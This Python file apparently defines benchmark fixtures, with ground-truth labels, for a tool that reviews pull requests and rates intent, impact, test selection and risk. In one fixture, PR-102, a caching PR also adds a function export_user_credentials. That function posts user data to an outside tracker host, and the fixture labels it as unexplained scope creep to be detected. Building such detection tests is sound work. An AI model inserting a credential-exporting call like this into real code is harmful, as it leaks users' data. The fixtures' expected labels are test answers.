"""Curated benchmark fixtures with ground-truth labels for evaluation (Milestone 10)."""
from dataclasses import dataclass, field
from typing import List, Dict, Optional


@dataclass
class DiffHunkFixture:
    """Fixture representation of a single diff hunk within a file."""
    hunk_index: int
    patch: str
    ground_truth_intent: str  # "EXPLAINED", "UNEXPLAINED", "UNCERTAIN"
    expected_entity_name: Optional[str] = None


@dataclass
class FileDiffFixture:
    """Fixture representation of a modified file."""
    filename: str
    patch: str
    old_source: Optional[str] = None
    new_source: Optional[str] = None
    hunks: List[DiffHunkFixture] = field(default_factory=list)


@dataclass
class BenchmarkFixture:
    """Complete PR evaluation benchmark fixture with ground-truth impact and test expectations."""
    fixture_id: str
    title: str
    description: str
    author: str
    files: List[FileDiffFixture]
    repo_sources: Dict[str, str] = field(default_factory=dict)
    expected_impacted_entities: List[str] = field(default_factory=list)
    expected_selected_tests: List[str] = field(default_factory=list)
    expected_risk_level: str = "LOW"  # "LOW", "MEDIUM", "HIGH"
    scenario_description: str = ""


def get_benchmark_fixtures() -> List[BenchmarkFixture]:
    """Returns the curated benchmark evaluation suite."""
    fixtures = []

    # -------------------------------------------------------------------------
    # Fixture 1: Focused Bugfix (Auth Token Expiration)
    # -------------------------------------------------------------------------
    f1_old_source = (
        "def refresh_token(token_str):\n"
        "    return True\n"
    )
    f1_new_source = (
        "def refresh_token(token_str):\n"
        "    if is_expired(token_str):\n"
        "        raise ValueError('Expired token')\n"
        "    return True\n"
    )
    f1_patch = (
        "@@ -1,2 +1,4 @@\n"
        " def refresh_token(token_str):\n"
        "+    if is_expired(token_str):\n"
        "+        raise ValueError('Expired token')\n"
        "     return True\n"
    )
    controller_source = (
        "from services.auth_service import refresh_token\n"
        "\n"
        "def handle_refresh():\n"
        "    return refresh_token('sample_jwt')\n"
    )
    test_auth_source = (
        "from services.auth_service import refresh_token\n"
        "\n"
        "def test_refresh_token_valid():\n"
        "    assert refresh_token('valid') is True\n"
    )

    f1 = BenchmarkFixture(
        fixture_id="PR-101",
        title="Fix token expiration validation in refresh_token",
        description="Resolves issue where JWT refresh tokens were not checking the expiration timestamp correctly in auth service.",
        author="alice",
        files=[
            FileDiffFixture(
                filename="services/auth_service.py",
                patch=f1_patch,
                old_source=f1_old_source,
                new_source=f1_new_source,
                hunks=[
                    DiffHunkFixture(
                        hunk_index=0,
                        patch=f1_patch,
                        ground_truth_intent="EXPLAINED",
                        expected_entity_name="refresh_token",
                    )
                ],
            )
        ],
        repo_sources={
            "services/auth_service.py": f1_new_source,
            "api/controller.py": controller_source,
            "tests/test_auth_service.py": test_auth_source,
        },
        expected_impacted_entities=["auth_service.py"],
        expected_selected_tests=["tests/test_auth_service.py::test_refresh_token_valid"],
        expected_risk_level="LOW",
        scenario_description="Isolated bugfix with direct keyword match in title, single caller in controller, and dedicated unit test.",
    )
    fixtures.append(f1)

    # -------------------------------------------------------------------------
    # Fixture 2: Unexplained Scope Creep (Database Optimization + Stealth Analytics)
    # -------------------------------------------------------------------------
    f2_repo_old = (
        "def get_user_by_id(user_id):\n"
        "    return db.query(user_id)\n"
    )
    f2_repo_new = (
        "def get_user_by_id(user_id):\n"
        "    cached = cache.get(user_id)\n"
        "    if cached:\n"
        "        return cached\n"
        "    return db.query(user_id)\n"
    )
    f2_repo_patch = (
        "@@ -1,2 +1,5 @@\n"
        " def get_user_by_id(user_id):\n"
        "+    cached = cache.get(user_id)\n"
        "+    if cached:\n"
        "+        return cached\n"
        "     return db.query(user_id)\n"
    )

    f2_analytics_old = (
        "def log_page_view(url):\n"
        "    pass\n"
    )
    f2_analytics_new = (
        "def log_page_view(url):\n"
        "    pass\n"
        "\n"
        "def export_user_credentials(user):\n"
        "    http.post('https://external-tracker.com', data=user)\n"
    )
    f2_analytics_patch = (
        "@@ -1,2 +1,5 @@\n"
        " def log_page_view(url):\n"
        "     pass\n"
        "+\n"
        "+def export_user_credentials(user):\n"
        "+    http.post('https://external-tracker.com', data=user)\n"
    )

    f2 = BenchmarkFixture(
        fixture_id="PR-102",
        title="Add redis caching layer to UserRepository get_user_by_id",
        description="Implements redis cache lookup for UserRepository to speed up queries.",
        author="bob",
        files=[
            FileDiffFixture(
                filename="repositories/user_repo.py",
                patch=f2_repo_patch,
                old_source=f2_repo_old,
                new_source=f2_repo_new,
                hunks=[
                    DiffHunkFixture(
                        hunk_index=0,
                        patch=f2_repo_patch,
                        ground_truth_intent="EXPLAINED",
                        expected_entity_name="get_user_by_id",
                    )
                ],
            ),
            FileDiffFixture(
                filename="analytics/tracker.py",
                patch=f2_analytics_patch,
                old_source=f2_analytics_old,
                new_source=f2_analytics_new,
                hunks=[
                    DiffHunkFixture(
                        hunk_index=0,
                        patch=f2_analytics_patch,
                        ground_truth_intent="UNEXPLAINED",
                        expected_entity_name="export_user_credentials",
                    )
                ],
            ),
        ],
        repo_sources={
            "repositories/user_repo.py": f2_repo_new,
            "analytics/tracker.py": f2_analytics_new,
        },
        expected_impacted_entities=["user_repo.py", "tracker.py"],
        expected_selected_tests=[],
        expected_risk_level="MEDIUM",
        scenario_description="Mixed PR containing an explained repository cache optimization alongside completely unmentioned tracker modifications (scope creep).",
    )
    fixtures.append(f2)

    # -------------------------------------------------------------------------
    # Fixture 3: Ambiguous / Empty PR Intent
    # -------------------------------------------------------------------------
    f3_old = (
        "def format_currency(value):\n"
        "    return f'${value}'\n"
    )
    f3_new = (
        "def format_currency(value):\n"
        "    return f'${value:,.2f}'\n"
    )
    f3_patch = (
        "@@ -1,2 +1,2 @@\n"
        " def format_currency(value):\n"
        "-    return f'${value}'\n"
        "+    return f'${value:,.2f}'\n"
    )

    f3 = BenchmarkFixture(
        fixture_id="PR-103",
        title="misc fixes",
        description="",
        author="carol",
        files=[
            FileDiffFixture(
                filename="utils/formatter.py",
                patch=f3_patch,
                old_source=f3_old,
                new_source=f3_new,
                hunks=[
                    DiffHunkFixture(
                        hunk_index=0,
                        patch=f3_patch,
                        ground_truth_intent="UNCERTAIN",
                        expected_entity_name="format_currency",
                    )
                ],
            )
        ],
        repo_sources={
            "utils/formatter.py": f3_new,
        },
        expected_impacted_entities=["formatter.py"],
        expected_selected_tests=[],
        expected_risk_level="MEDIUM",
        scenario_description="Ambiguous title and empty description where intent cannot be verified with certainty.",
    )
    fixtures.append(f3)

    # -------------------------------------------------------------------------
    # Fixture 4: Critical Blast Radius Architectural Change
    # -------------------------------------------------------------------------
    f4_db_old = (
        "class DatabasePool:\n"
        "    def execute(self, query):\n"
        "        return conn.run(query)\n"
    )
    f4_db_new = (
        "class DatabasePool:\n"
        "    def execute(self, query):\n"
        "        for attempt in range(3):\n"
        "            try:\n"
        "                return conn.run(query)\n"
        "            except Exception:\n"
        "                conn.reconnect()\n"
        "        raise ConnectionError('Failed after 3 retries')\n"
    )
    f4_db_patch = (
        "@@ -1,3 +1,8 @@\n"
        " class DatabasePool:\n"
        "     def execute(self, query):\n"
        "+        for attempt in range(3):\n"
        "+            try:\n"
        "+                return conn.run(query)\n"
        "+            except Exception:\n"
        "+                conn.reconnect()\n"
        "+        raise ConnectionError('Failed after 3 retries')\n"
    )
    billing_source = (
        "from core.database import DatabasePool\n"
        "\n"
        "def process_billing_transaction(amount):\n"
        "    db = DatabasePool()\n"
        "    return db.execute('INSERT INTO billing')\n"
    )
    orders_source = (
        "from core.database import DatabasePool\n"
        "\n"
        "def place_customer_order(order_data):\n"
        "    db = DatabasePool()\n"
        "    return db.execute('INSERT INTO orders')\n"
    )
    test_db_source = (
        "from core.database import DatabasePool\n"
        "\n"
        "def test_db_pool_execution():\n"
        "    pool = DatabasePool()\n"
        "    assert pool.execute('SELECT 1') is not None\n"
    )
    test_orders_source = (
        "from services.orders import place_customer_order\n"
        "\n"
        "def test_order_creation_flow():\n"
        "    res = place_customer_order({'id': 1})\n"
        "    assert res is not None\n"
    )

    f4 = BenchmarkFixture(
        fixture_id="PR-104",
        title="Upgrade DatabasePool execute method with auto-reconnect retry loop",
        description="Enhances DatabasePool execution to automatically reconnect upon socket failure during transaction runs.",
        author="dave",
        files=[
            FileDiffFixture(
                filename="core/database.py",
                patch=f4_db_patch,
                old_source=f4_db_old,
                new_source=f4_db_new,
                hunks=[
                    DiffHunkFixture(
                        hunk_index=0,
                        patch=f4_db_patch,
                        ground_truth_intent="EXPLAINED",
                        expected_entity_name="DatabasePool.execute",
                    )
                ],
            )
        ],
        repo_sources={
            "core/database.py": f4_db_new,
            "services/billing.py": billing_source,
            "services/orders.py": orders_source,
            "tests/test_database.py": test_db_source,
            "tests/test_orders.py": test_orders_source,
        },
        expected_impacted_entities=["DatabasePool", "database.py"],
        expected_selected_tests=[
            "tests/test_database.py::test_db_pool_execution",
        ],
        expected_risk_level="MEDIUM",
        scenario_description="Core database connection pool alteration with multiple cross-module callers, downstream services, and multi-tier test blast radius.",
    )
    fixtures.append(f4)

    return fixtures
